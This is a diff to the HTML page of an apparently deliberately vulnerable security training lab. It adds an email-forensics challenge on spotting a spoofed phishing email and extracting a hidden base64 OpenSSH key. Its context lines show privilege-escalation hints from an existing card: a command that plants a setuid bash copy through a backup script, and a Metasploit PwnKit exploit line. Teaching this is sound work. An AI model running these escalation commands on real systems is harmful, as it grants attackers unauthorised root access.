@@ -234,6 +234,16 @@ echo 'cp /bin/bash /tmp/rb && chmod u+s /tmp/rb' >> /opt/scripts/backup.sh     #
 use exploit/linux/local/cve_2021_4034_pwnkit_lpe_pkexec ; set SESSION N ; set LHOST &lt;you&gt; ; run   # → root</code></details>
   <p class="muted">📦 Download the lab (enum + README + solution) → <a href="/privesc/privesc_lab.tar.gz" download>tar.gz</a> · <a href="/privesc/privesc_lab.zip" download>zip</a> &nbsp;|&nbsp; full answers → <a href="/privesc/solution.md">solution.md</a> · <a href="https://gtfobins.github.io">GTFOBins</a></p></div>
 
+<div class="card"><h2>📧 Email forensics <span class="flag-pill">offline · headers + raw bytes</span></h2>
+  <p class="muted">🎯 <b>Goal:</b> analyse a phishing <code>.eml</code> — prove it's spoofed from the headers, trace where it really leads, and recover a secret <b>appended outside the MIME tree</b> that no mail client shows. Start → <a href="/email/">/email/</a></p>
+  <details><summary>🟢 Easy — is it legit? (SPF/DKIM/DMARC + look-alike domain)</summary><code class="pl">grep -iE '^(from|authentication-results|received):' phishing.eml
+# spf=fail · dkim=none · dmarc=fail · From vulncorp-secure.com (look-alike of vulncorp.local)</code></details>
+  <details><summary>🟡 Medium — where does it really go? (reply-to / link / origin)</summary><code class="pl">Reply-To: credentials@evil-collector.ru  ·  link host = …evil-collector.ru  ·  origin IP 185.165.240.54</code></details>
+  <details><summary>🟠 Hard — don't trust the MIME tree</summary><code class="pl"># there is content AFTER the closing boundary (--===============LABKIT==--) — a mail client never shows it. Look at the raw bytes.</code></details>
+  <details><summary>🔴 Expert — recover the hidden OpenSSH key</summary><code class="pl">grep -aboF 'LS0tLS1CRUdJTiBPUEVOU1NI' phishing.eml       # base64 of "-----BEGIN OPENSSH"
+tail -c +&lt;offset&gt; phishing.eml | base64 -d               # -> -----BEGIN OPENSSH PRIVATE KEY-----</code></details>
+  <p class="muted">📦 Download the lab → <a href="/email/email_lab.tar.gz" download>tar.gz</a> · <a href="/email/email_lab.zip" download>zip</a> &nbsp;|&nbsp; full answers → <a href="/email/solution.md">solution.md</a></p></div>
+
 </div>
 <footer>⚠️ <b>Intentionally vulnerable — training only.</b> Run locally / isolated lab; never expose it.</footer>
 <script>
